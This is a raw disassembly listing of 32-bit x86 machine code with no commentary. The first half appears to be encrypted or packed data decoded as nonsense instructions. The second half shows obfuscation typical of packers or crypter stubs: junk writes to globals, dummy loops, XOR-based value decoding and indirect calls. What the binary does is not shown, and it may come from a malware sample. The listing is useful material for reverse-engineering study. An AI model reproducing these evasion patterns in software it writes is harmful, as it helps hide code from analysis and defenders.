  41bcd8:	dec    ebp
  41bcd9:	xchg   esp,eax
  41bcda:	mov    eax,0x64efbb9
  41bcdf:	push   es
  41bce0:	call   0x1686:0x56f66353
  41bce7:	ins    BYTE PTR es:[edi],dx
  41bce8:	pop    ecx
  41bce9:	mov    esp,0xbd8cf09c
  41bcee:	or     bl,BYTE PTR [edi]
  41bcf0:	retf   0x45be
  41bcf3:	push   ebp
  41bcf4:	jl     0x41bca1
  41bcf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcf7:	adc    DWORD PTR [esi+0x4f],ebp
  41bcfa:	mov    eax,0x73e438ad
  41bcff:	popf   
  41bd00:	(bad)  
  41bd01:	and    DWORD PTR [ebp+0x31],eax
  41bd04:	test   eax,0x3d9693c1
  41bd09:	pop    ebp
  41bd0a:	or     eax,0x5e598be2
  41bd0f:	sub    bl,bl
  41bd11:	pop    ecx
  41bd12:	and    eax,0x65fe6303
  41bd17:	into   
  41bd18:	pop    esi
  41bd19:	enter  0x525f,0xa
  41bd1d:	and    al,0x6c
  41bd1f:	jl     0x41bce4
  41bd21:	inc    esi
  41bd22:	jle    0x41bccc
  41bd24:	xor    eax,0xca07f4c2
  41bd29:	pop    ss
  41bd2a:	shl    BYTE PTR [ebp-0x3d],0xb4
  41bd2e:	xor    ebx,DWORD PTR [ebx-0x74]
  41bd31:	cli    
  41bd32:	shl    DWORD PTR [eax-0x7a],0xa5
  41bd36:	xor    esp,DWORD PTR [eax+0x2116c12c]
  41bd3c:	push   0x80b227a1
  41bd41:	dec    edx
  41bd42:	mov    bl,0xab
  41bd44:	add    DWORD PTR [ebx],ecx
  41bd46:	ja     0x41bd13
  41bd48:	sti    
  41bd49:	ror    DWORD PTR [eax+0x5a8ba7bc],cl
  41bd4f:	and    eax,0x2066397c
  41bd54:	jae    0x41bd87
  41bd56:	into   
  41bd57:	pop    ss
  41bd58:	ins    BYTE PTR es:[edi],dx
  41bd59:	and    DWORD PTR [edi-0x7e],esp
  41bd5c:	cs data16 addr16 jo 0x41bd91
  41bd61:	dec    eax
  41bd62:	pop    ecx
  41bd63:	dec    esp
  41bd64:	pop    esp
  41bd65:	out    0x71,al
  41bd67:	pop    es
  41bd68:	and    eax,ebx
  41bd6a:	(bad)  
  41bd6b:	pop    ecx
  41bd6c:	xchg   esp,eax
  41bd6d:	ret    0x7715
  41bd70:	mov    ebp,0x39d7ca19
  41bd75:	loope  0x41bd6e
  41bd77:	adc    BYTE PTR [ecx+edx*2],dh
  41bd7a:	test   DWORD PTR [edi-0x49],0x284d6ee9
  41bd81:	pop    ds
  41bd82:	sub    DWORD PTR [esi+0x63cdadd],ecx
  41bd88:	pop    esp
  41bd89:	stos   DWORD PTR es:[edi],eax
  41bd8a:	adc    eax,0x3ab2eeb1
  41bd8f:	and    edx,edi
  41bd91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd92:	daa    
  41bd93:	arpl   WORD PTR [ebp-0x7c],bx
  41bd96:	outs   dx,BYTE PTR es:[esi]
  41bd98:	and    esi,0xfffffffc
  41bd9b:	mov    ds:0xd62ab5d6,eax
  41bda0:	sub    DWORD PTR [eax+ebp*4],esp
  41bda3:	inc    ebp
  41bda4:	repz aad 0xd5
  41bda7:	mov    bh,BYTE PTR [esi-0x36]
  41bdaa:	and    BYTE PTR [eax+eax*2+0x20],bl
  41bdae:	sar    bh,1
  41bdb0:	(bad)  
  41bdb1:	int3   
  41bdb2:	popf   
  41bdb3:	pop    ecx
  41bdb4:	add    eax,0x75186f15
  41bdb9:	jnp    0x41bdd1
  41bdbb:	cmp    DWORD PTR [esi],ebp
  41bdbd:	lods   eax,DWORD PTR ds:[esi]
  41bdbe:	xchg   DWORD PTR gs:[eax-0x7d587c48],eax
  41bdc5:	sbb    esi,esi
  41bdc7:	mov    ebx,0xc6750279
  41bdcc:	data16 loopne 0x41bd69
  41bdcf:	or     eax,DWORD PTR [ebp+0x12024cb2]
  41bdd5:	xor    edi,DWORD PTR [ebx-0x21]
  41bdd8:	jle    0x41bd5a
  41bdda:	not    esi
  41bddc:	or     esp,DWORD PTR [ebp-0x4f]
  41bddf:	adc    al,0x71
  41bde1:	sbb    al,0x14
  41bde3:	out    dx,eax
  41bde4:	pop    ds
  41bde5:	loopne 0x41be2a
  41bde7:	mov    bh,0x53
  41bde9:	pop    edi
  41bdea:	shr    BYTE PTR ds:[eax-0x5e],0xe6
  41bdef:	push   es
  41bdf0:	push   eax
  41bdf1:	leave  
  41bdf2:	sub    eax,0xd9a1569e
  41bdf7:	iret   
  41bdf8:	push   cs
  41bdf9:	loopne 0x41bdf7
  41bdfb:	mov    bh,0xa7
  41bdfd:	fnstsw WORD PTR [edi+0x68ba3eea]
  41be03:	loopne 0x41be68
  41be05:	js     0x41bdd3
  41be07:	(bad)  
  41be08:	adc    ch,BYTE PTR [eax]
  41be0a:	fst    QWORD PTR [esi+0x77]
  41be0d:	shl    ch,cl
  41be0f:	nop
  41be10:	jnp    0x41be14
  41be12:	mov    cl,0x71
  41be14:	lods   al,BYTE PTR ds:[esi]
  41be15:	mov    cs,WORD PTR [eax]
  41be17:	push   0x96b4e7c8
  41be1c:	das    
  41be1d:	rcl    BYTE PTR [esi-0x3],1
  41be20:	xor    eax,0x490e1d59
  41be25:	clc    
  41be26:	push   esi
  41be27:	lods   eax,DWORD PTR ds:[esi]
  41be28:	fimul  DWORD PTR [ebx]
  41be2a:	aad    0x66
  41be2c:	pusha  
  41be2d:	sub    DWORD PTR [eax-0x69],ecx
  41be30:	push   ds
  41be31:	jmp    0x3368f219
  41be36:	sbb    eax,0xa3c6dce1
  41be3b:	(bad)  
  41be3c:	push   esi
  41be3d:	(bad)  [ecx+0x74]
  41be40:	fcom   DWORD PTR [eax-0x34dc7ffb]
  41be46:	fadd   st(5),st
  41be48:	repnz sub DWORD PTR [eax],ebp
  41be4b:	xchg   edi,eax
  41be4c:	in     al,dx
  41be4d:	ins    DWORD PTR es:[edi],dx
  41be4e:	add    al,0x99
  41be50:	ss call 0x2a4f:0x26ba
  41be57:	sbb    al,0x14
  41be59:	mov    eax,ds:0x6018a1c4
  41be5e:	xor    bh,BYTE PTR [ecx+esi*2+0x4c]
  41be62:	pop    ds
  41be63:	ds xor al,0xc9
  41be66:	dec    ecx
  41be67:	dec    ecx
  41be68:	mov    eax,ds:0xfaa4005f
  41be6d:	retf   
  41be6e:	jl     0x41be44
  41be70:	mov    cl,BYTE PTR [ebx-0x4c]
  41be73:	jmp    0x41be2e
  41be75:	rcr    BYTE PTR [ebx-0x7d],1
  41be78:	ret    
  41be79:	jp     0x41be39
  41be7b:	pop    esi
  41be7c:	cmp    BYTE PTR ds:0x1acee0d5,ah
  41be82:	fucomi st,st(3)
  41be85:	mov    eax,ds:0x1e8d493
  41be8a:	and    BYTE PTR [eax-0x2051b43b],bl
  41be90:	ret    
  41be91:	aaa    
  41be92:	xlat   BYTE PTR ds:[ebx]
  41be93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be94:	pop    ebp
  41be95:	mov    al,ds:0x46dd1657
  41be9a:	ffreep st(6)
  41be9c:	fisttp QWORD PTR [ebx+0xa]
  41be9f:	(bad)  
  41bea1:	enter  0xe568,0xc5
  41bea5:	mov    ebx,0x6e47ce11
  41beaa:	xchg   edx,eax
  41beab:	sub    ah,ch
  41bead:	out    dx,al
  41beae:	adc    edx,edi
  41beb0:	push   ss
  41beb1:	test   DWORD PTR [esi],esp
  41beb3:	aas    
  41beb4:	add    cl,BYTE PTR [edx+0x3c]
  41beb7:	dec    esp
  41beb8:	imul   edi,DWORD PTR es:[ecx+edi*4-0x6fc07007],0x6e15cda5
  41bec4:	and    eax,esp
  41bec6:	mov    ch,0x6f
  41bec8:	arpl   cx,bp
  41beca:	sbb    edi,DWORD PTR [ecx]
  41becc:	xchg   ebp,eax
  41becd:	add    bl,bh
  41becf:	sahf   
  41bed0:	cwde   
  41bed1:	icebp  
  41bed2:	aaa    
  41bed3:	es scas al,BYTE PTR es:[edi]
  41bed5:	dec    eax
  41bed6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bed7:	lock fdivr QWORD PTR [eax-0x19]
  41bedb:	mov    esp,0x8de92906
  41bee0:	in     al,0xcf
  41bee2:	push   ss
  41bee3:	jmp    0x41bf39
  41bee5:	mov    al,0xba
  41bee7:	aas    
  41bee8:	(bad)
  41beeb:	in     al,dx
  41beec:	mov    esi,0x44b981ca
  41bef1:	sub    al,cl
  41bef3:	sub    DWORD PTR [edx],0x1f723a6f
  41bef9:	sbb    al,0xab
  41befb:	pushf  
  41befc:	jb     0x41bf5e
  41befe:	add    eax,0x6d489bbb
  41bf03:	int    0xe9
  41bf05:	ins    BYTE PTR es:[edi],dx
  41bf06:	in     eax,0x75
  41bf08:	mov    BYTE PTR [ebx-0x15d85a9d],bh
  41bf0e:	aaa    
  41bf0f:	sbb    DWORD PTR [edx-0x68],ebp
  41bf12:	(bad)  
  41bf13:	or     eax,0x9a49a75f
  41bf18:	int3   
  41bf19:	sbb    esp,DWORD PTR [esi-0x67]
  41bf1c:	mov    ecx,0x48b60672
  41bf21:	add    al,0x7c
  41bf23:	clc    
  41bf24:	mov    ebx,0xa6399df3
  41bf29:	cmp    esp,DWORD PTR ds:0x2cd4c0fe
  41bf2f:	inc    eax
  41bf30:	add    ebp,DWORD PTR [eax+0x43]
  41bf33:	outs   dx,DWORD PTR cs:[esi]
  41bf35:	mov    edx,0x667dbea2
  41bf3a:	mov    eax,0x7812d132
  41bf3f:	adc    al,0x5e
  41bf41:	push   ss
  41bf42:	je     0x41bef6
  41bf44:	or     eax,0x1aa992c9
  41bf49:	in     eax,0x89
  41bf4b:	inc    esi
  41bf4c:	mov    ah,0x68
  41bf4e:	xor    DWORD PTR [ebx],ebx
  41bf50:	mov    WORD PTR [edx],cs
  41bf52:	dec    ebx
  41bf53:	sti    
  41bf54:	xor    BYTE PTR [eax+0x346d5b66],bh
  41bf5a:	jbe    0x41bf4c
  41bf5c:	xchg   esi,eax
  41bf5d:	pop    edi
  41bf5e:	cmp    al,0xa9
  41bf60:	xor    DWORD PTR [edx-0x54],ebx
  41bf63:	fistp  QWORD PTR [edi-0x63]
  41bf66:	cld    
  41bf67:	lods   eax,DWORD PTR ds:[esi]
  41bf68:	dec    eax
  41bf69:	or     eax,0x7462bd00
  41bf6e:	dec    esp
  41bf6f:	arpl   WORD PTR [ebx],si
  41bf71:	sub    eax,0x7520c050
  41bf76:	out    0x65,eax
  41bf78:	mov    dl,0xeb
  41bf7a:	jno    0x41bfda
  41bf7c:	ds cmp eax,0x59075065
  41bf82:	leave  
  41bf83:	cs or  eax,0x48458e36
  41bf89:	sbb    eax,0xef59d8fe
  41bf8e:	lock sbb BYTE PTR [edx+0x29c06313],bl
  41bf95:	jae    0x41c005
  41bf97:	aas    
  41bf98:	push   ds
  41bf99:	cmp    al,bl
  41bf9b:	jecxz  0x41bf5d
  41bf9d:	adc    eax,DWORD PTR [esi]
  41bf9f:	(bad)  
  41bfa0:	dec    ebx
  41bfa1:	mov    WORD PTR [eax],gs
  41bfa3:	add    al,0x8f
  41bfa5:	jo     0x41bf74
  41bfa7:	or     BYTE PTR [edx+eiz*1+0x7b5e81c5],0x61
  41bfaf:	loop   0x41c007
  41bfb1:	rcl    DWORD PTR [esi+esi*8-0x2e03237e],cl
  41bfb8:	ss data16 mov dh,0x9
  41bfbc:	ja     0x41bfdd
  41bfbe:	pop    edx
  41bfbf:	test   eax,ecx
  41bfc1:	aaa    
  41bfc2:	cs mov esi,0x6e919570
  41bfc8:	jmp    0x41bf79
  41bfca:	adc    DWORD PTR [ecx],edx
  41bfcc:	cmp    eax,0xa6a7c80d
  41bfd1:	retf   
  41bfd2:	adc    BYTE PTR [ebx],al
  41bfd4:	xchg   esp,eax
  41bfd5:	push   cs
  41bfd6:	(bad)  
  41bfd7:	sub    ebp,DWORD PTR [edx]
  41bfd9:	mov    esi,0x3e8edac7
  41bfde:	loop   0x41bfcb
  41bfe0:	sbb    dl,dl
  41bfe2:	push   esi
  41bfe3:	xor    al,0xc8
  41bfe5:	jle    0x41c032
  41bfe7:	je     0x41bf92
  41bfe9:	ins    BYTE PTR es:[edi],dx
  41bfea:	mov    edi,0x6f1f9991
  41bfef:	loope  0x41bf7f
  41bff1:	jae    0x41c068
  41bff3:	fimul  WORD PTR [ebx+0x6153c86a]
  41bff9:	ja     0x41bfc3
  41bffb:	ret    
  41bffc:	js     0x41bfb3
  41bffe:	pop    esi
  41bfff:	add    al,0x9b
  41c001:	ficomp WORD PTR [edi+0x51]
  41c004:	retf   
  41c005:	xchg   ebp,eax
  41c006:	add    eax,0x6f698a6e
  41c00b:	add    BYTE PTR [eax+eax*2-0x2c411481],al
  41c012:	dec    ebx
  41c013:	jae    0x41c047
  41c015:	icebp  
  41c016:	mov    ch,0xd0
  41c018:	xchg   ecx,eax
  41c019:	or     edx,DWORD PTR [esi]
  41c01b:	inc    edi
  41c01c:	mul    ch
  41c01e:	push   ds
  41c01f:	test   DWORD PTR [esi-0x7a],esp
  41c022:	inc    ecx
  41c023:	push   esi
  41c024:	inc    esp
  41c025:	sub    BYTE PTR [ecx],bl
  41c027:	push   ebp
  41c028:	xchg   edx,eax
  41c029:	fnstcw WORD PTR [edx+0x4c]
  41c02c:	mov    esp,0xffcdec5c
  41c031:	(bad)  
  41c033:	rol    DWORD PTR [edx+edi*4],0x74
  41c037:	fcomip st,st(0)
  41c039:	pop    ebp
  41c03a:	cmp    al,0x2b
  41c03c:	js     0x41c044
  41c03e:	add    BYTE PTR [ecx+0x63393af5],bh
  41c044:	dec    eax
  41c045:	mov    DWORD PTR [edi+ebp*8+0x6f],ebp
  41c049:	xor    BYTE PTR [esi-0x357be37f],ah
  41c04f:	inc    esi
  41c050:	jne    0x41c073
  41c052:	xchg   ebp,ebx
  41c054:	cdq    
  41c055:	jbe    0x41c076
  41c057:	inc    eax
  41c058:	loopne 0x41c07d
  41c05a:	mov    al,0xc3
  41c05c:	sbb    esi,DWORD PTR [ebx]
  41c05e:	cmp    cl,BYTE PTR [esi+0x2d]
  41c061:	call   0xdcc6:0xb20df7f4
  41c068:	push   eax
  41c069:	jp     0x41c04a
  41c06b:	adc    edx,DWORD PTR [esi+ebp*4-0x104cf047]
  41c072:	mov    ah,0x7f
  41c074:	cmp    bh,dh
  41c076:	daa    
  41c077:	jbe    0x41c0cb
  41c079:	movq   QWORD PTR ds:0xd767b18f,mm0
  41c080:	push   eax
  41c081:	pop    ebx
  41c082:	pop    eax
  41c083:	iret   
  41c084:	adc    DWORD PTR [ebx],eax
  41c086:	out    dx,eax
  41c087:	mov    esi,0x75098bdb
  41c08c:	dec    eax
  41c08d:	dec    edi
  41c08e:	cmp    al,0xd8
  41c090:	adc    ebp,DWORD PTR ds:0xe9c3f36b
  41c096:	sbb    eax,0xb74aaf0
  41c09b:	mov    BYTE PTR [edx+0x19],bh
  41c09e:	ss mov cl,0xcd
  41c0a1:	out    0xdc,al
  41c0a3:	adc    dl,BYTE PTR [ebp-0x51327a94]
  41c0a9:	jae    0x41c0ec
  41c0ab:	xchg   edx,eax
  41c0ac:	add    eax,0xe332847d
  41c0b1:	push   edx
  41c0b2:	add    DWORD PTR [edi+0x5f395d45],0xefc15672
  41c0bc:	clc    
  41c0bd:	es jo  0x41c11f
  41c0c0:	std    
  41c0c1:	mov    ds:0x2c159d53,eax
  41c0c6:	addr16 add eax,0x7cd71cf4
  41c0cc:	push   cs
  41c0cd:	adc    eax,0xf4ed0706
  41c0d2:	dec    ebp
  41c0d3:	pop    ebp
  41c0d4:	div    BYTE PTR [ebp*1-0x49f6e2e0]
  41c0db:	dec    ebx
  41c0dc:	push   ebp
  41c0dd:	call   0x1513:0xba505552
  41c0e4:	fs cmp al,0xa7
  41c0e7:	or     eax,0xe7ab208c
  41c0ec:	in     al,dx
  41c0ed:	ss dec edi
  41c0ef:	sti    
  41c0f0:	sub    BYTE PTR [edi+ebp*4+0x59aaad5a],0xa
  41c0f8:	mov    WORD PTR [ecx-0x1f5d571f],cs
  41c0fe:	mov    ecx,DWORD PTR [ebp-0x18]
  41c101:	add    edi,edx
  41c103:	cmp    ecx,edi
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x42fa50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x42fa34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x42fa18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428e65
  41c331:	mov    ebx,DWORD PTR ds:0x42af19
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x42fa4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x42fa1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x42fa20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
